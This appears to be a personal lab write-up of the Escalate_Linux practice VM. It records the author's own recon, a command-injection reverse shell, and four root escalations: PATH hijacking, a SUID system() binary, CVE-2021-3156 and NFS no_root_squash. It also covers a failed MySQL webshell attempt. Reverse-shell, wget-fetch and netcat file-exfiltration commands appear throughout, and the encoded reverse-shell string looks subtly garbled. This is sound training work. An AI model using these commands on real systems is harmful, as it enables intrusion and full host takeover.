
# Target Log: Escalate_Linux
**Date Started:** 2026-07-28
**Target IP:** 192.168.56.103

---
## 1. Initial Entry Point
### System Discovery
* **Initial Access Method:** 
   **commands run:**
   ```bash
   # Host discovery
   nmap -sn 192.168.56.0/24
   # Check open ports and services
   nmap -sS -T3 192.168.56.103
   # Check version for open port 80
   nmap -sv -sC -p80 192.168.56.103
   # Find files the developer left behind but didn't link to main page
   gobuster dir -u http://192.168.56.103 -w /usr/share/wordlists/dirbuster/directory-list-22.3-medium.txt -x php,txt,html
   # Test for parameters
   curl http://192.168.56.103/shell.php?cmd=id
   # Confirm it is an OS injection
   curl http://192.168.56.103/shell.php?cmd=cat /etc/passwd
   # Gaining foothold via reverse shell
   # On terminal 1 open a listner
   nc -lvnp 4444
   # On terminal 2 execute the reverse shell
   curl "http://192.168.56.103/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp2F192.168.56.102%2F44445200%3E%261%27"
   # The reverse shell is caught in terminal 1, we stabilize it
   script /dev/null -c bash
   export TERM=xterm
   # Press Ctrl + Z to background the shell, then run:
   stty raw -echo; fg
   # Press enter twice then
   reset
   ```
   
* **Initial User Account:** user6

### Access Environment
```text
[Paste your initial system environment details here (OS version, kernel info)]
```

---
## 2. Exploitation Logs
*Duplicate this section for every new technique you discover and try out on the system*
### Attack Attempt #[1]
* **Area Explored:** SUID binary /home/user5/script -- PATH Hijacking
* **Vulnerability Type:** Relative Path Execution(PATH Hijacking)
* **Status:** Gained root

#### 1.Enumeration & Discovery ####
Identify all files that run with elevated privileges regardless of the user executing them.
 **Command:**
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 **Analysis of Findings:**
 Among the standard system binaries(like sudo, passwd, pkexec), a non-standard file stood out: */home/user5/script*. Its location inside a user's home directory, rather than */usr/bin* or */bin*, makes it highly suspicious.
#### 2. Static Analysis(strings) ####
Look for hardcoded commands or clues without executing the binary.
 **Command:**
 ```bash
 strings /home/user5/script
 ```
  **Why this matters:**
  Static analysis reveals readable strings embedded in the binary. If we see references to system commands (e.g., ls, cat, echo) without absolute paths (e.g., /bin/ls), it indicates the binary relies on the system's $PATH variable to locate these executables.
#### 3. Dynamic Analysis(ltrace) ####
Trace exactly which system calls and library functions the binary executes in real time.
 **Command:**
 ```bash
 ltrace /home/user5/script
 ```
  **Why this matters:**
  The ltrace output is the key to the exploit. It showed that binary executes the command ls using the relative path (i.e., ls), not the absolute path (/bin/ls).
#### 4. Exploitation 
Create a fake, malicious ls binary that spawns a root shell, then the SUID script into running it.
Create a fake ls in /tmp. When executed, it will launch a Bash shell while preserving the effective user ID (root) using the -p flag.
```bash
cd /tmp
echo "/bin/bash -p" > ls
chmod +x ls
```
We prepend /tmp to the existing $PATH. This ensures that when the system looks for ls, it finds our malicious version in /tmp before the legitimate one in /bin.
```bash
export PATH=/tmp:$PATH
```
We run the SUID script from its own directory (or anywhere). Because it runs as root and uses our hijacked PATH, it executes  our fake ls with root privileges.
```bash
cd /home/user5
/home/user5/script
```
**Outcome:**
Executing /home/user5/script triggers our fake ls, which spawns a Bash shell. Running whoami confirms we are root. The SUID privilege has been successfully exploitated.

#### 5. Why This Vector Worked
* The developer used the relative path(ls) instead of the absolute path (/bin/ls) inside a SUID binary.
* The $PATH variable is user-controllable.
* By placing a malicious binary earlier in the $PATH, we overwrite the command the root-owned script executes.

### Attack Attempt #[2]
* **Area Explored:** SUID binary (user3's Home directory)
* **Vulnerability Type:** Unfiltered 'system()' call/ command injection
* **Status:** Gained root
#### 1. Static analysis
Extract human-readable strings from the binary to understand what it does without executing it.
**Command:**
```bash
strings /home/user3/shell
```
**Key findings:**
*setuid/setgid* The binary explicitly changes its effective UID/GID to root. *system* The binary uses the *system()* function, which executes shell commands.

#### 2. Dynamic Analysis
Trace library calls in real-time to see exactly what the binary does when when executed.
**Command:**
```bash
ltrace /home/user3/shell
```
**Output revealed:**
The *ltrace* output showed that the binary executes a *system()* call with a command string.

#### 3. Exploitation
Executing the binary in a way that triggers the root shell.
```bash
cd /home/user3
./shell
```
**Outcome:**
Executing /home/user3/shell spawned a Bash shell with root privileges. Running whoami confirmed we are root.

#### 4. Why This Vector Worked
* The binary is owned by root and has SUID bit set. It runs with root privileges regardless of who executes it.
* The binary uses system() to execute shell commands. If the user input is unfiltered and passed to system(), this is a classic Command injection vulnerability.
* The binary appears to have a hardcoded command that spawns a shell.

### Attack Attempt #[3]
* **Area Explored:** Sudo Version
* **Status:** Gained Root
* **Vulnerability Type:** Heap-Based buffer Overflow
* **CVE identifier:** CVE-2021-3156
* **Exploit Name:** Baron Samedit

#### 1. Vulnerability Discovery
Identify the installed sudo version and determine if it is vulnerable to any known exploits.
**Command:**
```bash
sudo --version
```
**Key Finding:**
```text
sudo version 1.8.21p2
```
**Analysis of Findings:**
The installed sudo version is 1.8.21p2. This falls within the vulnerable range for CVE-2021-3156, a critical heap-based buffer overflow vulnerability discovered by the Qualys security team in January 2021.

#### 2. Understanding the Vulnerability
**Why This Vulnerability Exists:**
The vulnerability resides in sudo's command-line argument parsing logic. When sudo is run with the '-s' (shell mode) or '-i' (simulate initial login) flags, it attempts to escape backlash characters in command arguments. However, when 'sudoedit' is run with these same flags, the escaping does not occur--allowing a specially crafted argument ending with a single backlash to trigger a heap-based buffer overflow.
**The Exploit Chain:**
* An unprivileged user executes *sudoedit -s* with a maliciously crafted command-line argument ending with a backlash (\)
* The flawed argument parsing causes a heap-based overflow.
* The overflow corrupts heap metdata, allowing the attacker to overwrite a *service_user* struct on the heap.
* This struct corruption enables the attacker to gain root privileges--regardless of their sudoers entries.

#### 3. Exploitation Setup ####
Transfer the exploit to the target machine and execute it.
**Obtain the Exploit**
On attacker machine, clone the public exploit repository:
```bash
git clone https://github.com/worawit/CVE-2021-3156
```
**Compress the Exploit Files**
The exploit directory contains multiple files. Compress them into a tarball fro easy transfer:
```bash
tar -czvf exploit.tar.gz CVE-2021-3156
```
**Host the Exploit(Attacker Machine)**
Set up a simple HTTP server to serve the exploit to the target:
```bash
python3 -m http.server 8080
```

#### 4. Exploitation Execution(Target Machine)
**Download the Exploit**
On the target machine (as a low privileged user), to navigate to a writable directory and download the exploit:
```bash
cd /tmp
wget http://192.168.56.102:8080/exploit.tar.gz
```
**Extract and navigate to the exploit directory and execute the Exploit**
```bash
tar -xzvf exploit.tar.gz
cd /tmp/CVE-2021-3156/
python3 exploit-nss.py
```
**Outcome:**
After execution, we are dropped into a shell with root privileges. Running *whoami* confirms we are *root*.

#### 5. Why This Vector Worked ####
The heap-based overflow affects version 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1.
The exploit works regardless of the user's sudoer entries.

### Attack Attempt #[4]
- **Area Explored:** NFS Exports / Network File System Configuration
- **Status:** Gained Root
- **Vulnerability Type:** Misconfigured NFS Export (`no_root_squash`)
- **Vector:** SUID Binary Injection via Mounted Share

#### 1. Enumeration & Discovery
Identify NFS shares and check their export options for misconfiguration
**Check NFS Exports (Target Machine)**
With a low-privilege shell on the target, read the NFS export configuration file:
```bash
cat /etc/exports
```

**Key Finding:**
```text
/home/user5/ *(rw,no_root_squash)
```
 **The Vulnerability:**
`no_root_squash` is the critical misconfiguration. By default, NFS maps UID 0 (root) on the client to the `nobody` user on the server to prevent remote root access. Disabling this (`no_root_squash`) allows the client's root user to create files on the server **as root**.

#### 2. Mounting the NFS Share (Attacker Machine)
Mount the vulnerable NFS share from the attacker machine with root privileges.
**Create a Mount Point**
```bash
sudo mkdir -p /tmp/nfs_mount
```
**Mount the Share**
```bash
sudo mount -t nfs <TARGET_IP>:/home/user5 /tmp/nfs_mount -o nolock
```
We use `sudo` (root privileges) to mount the share. Because the client is acting as root, any file we create on the mounted share will be owned by UID 0 (root) on the server.
#### 3.Initial Attempt: Injecting Kali's Shell (The GLIBC Trap)
Copy a shell binary from the attacker machine, set the SUID bit, and execute it on the target.
**Initial Attempt:**
```bash
# Copy Kali's /bin/bash into the share
sudo cp /bin/bash /tmp/nfs_mount/bash_root
# Set ownership to root
sudo chown root:root /tmp/nfs_mount/bash_root
# Set SUID bit
sudo chmod 4755 /tmp/nfs_mount/bash_root
```
**Analysis of Findings (The Error):**
When executing `/home/user5/bash_root -p` on the target machine, we encountered:
```text
bash_root: error while loading shared libraries: libtinfo.so.6: cannot open shared object file
bash_root: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found
bash_root: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found
bash_root: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found
```
**The Lesson:** Binaries compiled against newer GLIBC versions **cannot** run on older systems without the correct shared libraries. The target machine lacks the required GLIBC symbols, causing the execution to fail.

#### 4. The Fix: Exfiltrating the Target's Native Shell
Transfer the target's native `/bin/sh` binary to the attacker machine, then inject it into the NFS share with SUID permissions.
**Set Up a Listener on the Attacker Machine**
```bash
nc -lvnp 4445 > /tmp/target_sh
```
This command listens on port 4445 and saves the incoming data to `/tmp/target_sh`.
**Send the Target's Shell to the Attacker (Target Machine)**
On the target machine (low-privilege shell), send `/bin/sh` to the attacker:
```bash
cat /bin/sh | nc <ATTACKER_IP> 4445
```
**Wait for the Transfer**
After running the `cat` command, wait 2–3 seconds, then press **Ctrl+C** on the attacker's `nc` listener to stop the capture.
#### 5.Injecting the SUID Shell
Place the target's native shell into the NFS share with root ownership and SUID permissions.
```bash
# Copy the Native Shell into the Share
sudo cp /tmp/target_sh /tmp/nfs_mount/sh_root
# Set Root Ownership
sudo chown root:root /tmp/nfs_mount/sh_root
# Set the SUID Bit
sudo chmod 4755 /tmp/nfs_mount/sh_root
```
#### 6. Exploitation: Executing the SUID Shell
Execute the SUID binary on the target machine to spawn a root shell.
```bash
/home/user5/sh_root -p
# Confirm Root Access
whoami
# Output: root
```
#### 7. Why This Vector Worked
* The NFS server allows client root to create files as root on the server.
* By placing an SUID binary on the server, any user executing it gains root privileges
* We avoided library mismatches by using the target's own binary (`/bin/sh`).
* Preserves effective UID when executing `dash`, ensuring root privileges are maintained.

## Alternative Vectors: Non-Root / Horizontal Movement

---

### A. Unix Domain Socket (UDS) MySQL Discovery
- **Area Explored:** Local Service Exposure
- **Vector Classification:** Horizontal Movement (Service Switching)
- **Status:** Successful Enumeration, Futile Escalation

#### 1. Discovery & Analysis
Identify non-standard local communication channels that might allow lateral movement between services.
**Command:**
```bash
find /var/run -type s -perm -o+w 2>/dev/null
```
**Key Output:**
```text
/var/run/mysqld/mysqld.sock
```
The MySQL socket was found to be **world-writable** (`o+w`). This means any local user (including `www-data` or `user6`) can connect to the MySQL database without needing network access or authentication.

#### 2. Exploitation Attempt
**Command:**
```bash
mysql -u root -S /var/run/mysqld/mysqld.sock
```
We successfully connected to MySQL as `root` with **no password required**.
**Privileges Confirmed:**
```sql
SHOW GRANTS;
-- Result: ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION
```
#### 3. Escalation Attempt (Futile)
Leverage MySQL access to gain OS-level root.

| Technique                    | Attempted       | Result            | Reason                                                                               |
| ---------------------------- | --------------- | ----------------- | ------------------------------------------------------------------------------------ |
| `LOAD_FILE('/etc/shadow')`   | ❌ Failed        | `NULL`            | MySQL OS user lacks read permissions (root:shadow, 640).                             |
| `SELECT ... INTO OUTFILE`    | ❌ Failed        | Permission Denied | `secure_file_priv = /var/lib/mysql-files/` restricts writes.                         |
| `general_log` webshell write | ❌ Failed        | Errcode 13        | MySQL user lacks write access to `/var/www/html/`.                                   |
| UDF (User Defined Function)  | ❌ Not Attempted | N/A               | Plugin directory (`/usr/lib/mysql/plugin/`) is root-owned and unwritable by `mysql`. |
|                              |                 |                   |                                                                                      |

**Conclusion:** MySQL `root` access provides powerful **database-level** privileges, but OS-level restrictions prevented direct privilege escalation to system root.

---
## 3. Post-Lab Retrospective
### A. What worked best:
**1. Methodical Enumeration**  
Running `find / -perm -u=s -type f 2>/dev/null` early in the process revealed multiple SUID binaries that became the foundation for three separate root vectors. This single command yielded the highest return on investment.

**2. Dynamic Analysis with `ltrace` and `strings`**  
Instead of blindly executing suspicious binaries, using `strings` to inspect static content and `ltrace` to trace library calls in real-time provided crucial insights. The PATH hijacking vector was discovered because `ltrace` revealed the binary was calling `ls` via a relative path, not an absolute one.

**3. NFS `no_root_squash` Exploitation**  
This was the most reliable and repeatable vector. The key breakthrough was realizing that copying Kali's binaries failed due to GLIBC mismatches, and the solution was to exfiltrate the target's own `/bin/sh` using `netcat`, then inject it back via the NFS mount with SUID permissions.

**4. Version Enumeration for CVEs**  
A simple `sudo --version` check revealed an outdated version (1.8.21p2) vulnerable to CVE-2021-3156. This led to a one-command root escalation using a public exploit—highlighting the importance of checking service versions during enumeration.

**5. Horizontal Movement Awareness**  
Discovering the world-writable MySQL socket (`/var/run/mysqld/mysqld.sock`) demonstrated that service-to-service pivoting is possible even without root privileges. Though it didn't lead to OS root, it was a valuable recon win.
### B.Where I got stuck:
**1. GLIBC Version Mismatch**  
The first major roadblock was copying `/bin/bash` from Kali into the NFS share and executing it on the target. The error messages about missing GLIBC versions (2.33, 2.34, 2.38) and `libtinfo.so.6` were frustrating at first. It took time to realize this was a compatibility issue and not a permissions problem.

**How I Overcame It:**  
I researched the error, understood that GLIBC is backward-compatible but not forward-compatible, and then switched to using the target's own binary. The `nc` exfiltration method solved the problem entirely.

**2. MySQL `LOAD_FILE()` Returning `NULL`**  
When attempting to read `/etc/shadow` via MySQL's `LOAD_FILE()`, I kept getting `NULL`. I initially assumed it was a privilege issue within MySQL, but it was actually an OS-level permission issue—the `mysql` user simply couldn't read the shadow file.

**How I Overcame It:**  
I tested `LOAD_FILE('/etc/passwd')` (world-readable) and it worked. This confirmed the issue was OS permissions, not MySQL privileges. I documented it as a futile vector and moved on.

**3. Mysql `general_log` Webshell Write Permissions**  
Attempting to write a webshell via `SET GLOBAL general_log_file = '/var/www/html/shell.php'` returned Errcode 13 (Permission Denied). I had to confirm that the `mysql` user lacked write access to the web root.

**How I Overcame It:**  
I checked the directory permissions with `ls -la /var/www/html/` and confirmed it was owned by `www-data`, not writable by `mysql`. This taught me that database root privileges don't bypass filesystem permissions.

**4. Staying Organized**  
With 4 successful root vectors and multiple failed attempts, it became challenging to keep track of which commands were run, what worked, and what didn't. Initially, I was just typing commands in a terminal without taking notes.

**How I Overcame It:**  
I started structuring my notes immediately after each attempt, separating "Successes" from "Failures." This eventually became this GitHub write-up.
### C. Key takeaway for future machines:
**1. Target's OS Version Dictates Exploit Compatibility**  
Always check the target's GLIBC version (`ldd --version`) before copying binaries from your attacker machine. When in doubt, exfiltrate the target's own binaries and use them locally. This is especially important for SUID injection and UDF exploitation.

**2. Enumerate and Verify Your Assumptions**  
Just because you have `root` privileges inside a service (like MySQL) doesn't mean you have system root. Always check OS-level permissions and `secure_file_priv` settings before investing time in a vector.

**3. Keep a Command Log**  
Document every command you run, even the failed ones. Future you will thank you when you revisit a similar box and remember what worked and what didn't. Tools like `script` or `tmux` logging can help automate this.

**4. Multiple Paths to Root Are Common**  
On intentionally vulnerable machines like this one, there are often 5–10 different ways to escalate privileges. Don't stop after the first win—explore other vectors to deepen your understanding of each vulnerability class (SUID, Sudo CVEs, NFS, MySQL UDF, etc.).

**5. Dynamic Analysis is Your Friend**  
`ltrace` and `strace` are underrated tools. They reveal exactly what a binary does under the hood, exposing relative path calls, system commands, and obfuscated behavior that `strings` alone might miss.

**6. Know When to Move On**  
Not every promising vector leads to root. Being able to quickly test, fail, document, and move on is a critical skill. The MySQL vector looked promising, but after hitting OS permission walls, it was more efficient to pivot to NFS and Sudo CVEs.

**7. Use the Target's Native Tools**  
When transferring files, use `nc`, `wget`, or `curl` depending on what's available. If the target has limited tools, fall back to `cat` and `/dev/tcp` (if Bash is available). Flexibility is key.

**8. Document the "Why"**  
For each command, explain why you ran it and what the output told you. This turns a simple "typing exercise" into a learning resource for you (and others reading your GitHub).

**9. Horizontal Movement is Often Easier Than Vertical**  
Moving between users (horizontal escalation) is sometimes easier than going straight to root. Each user might have different privileges, cron jobs, or SUID binaries. Enumerate every user's home directory if you have read access.

**10. Practice Both Manual and Automated Exploitation**  
Manual exploitation teaches you the underlying mechanics (like PATH hijacking, buffer overflows, and file permissions). Automated tools (like public exploits for CVE-2021-3156) are efficient but should be understood before use.

---
### Final Reflection

Escalate_Linux:1 was a challenging but incredibly rewarding experience. It reinforced the importance of **thorough enumeration**, **logical troubleshooting**, and **systematic documentation**.

**The biggest lesson:** Root access isn't just about finding a single exploit—it's about understanding the entire system, its misconfigurations, and how each piece (SUID binaries, NFS exports, service versions, cron jobs) can be chained together to achieve your goal.

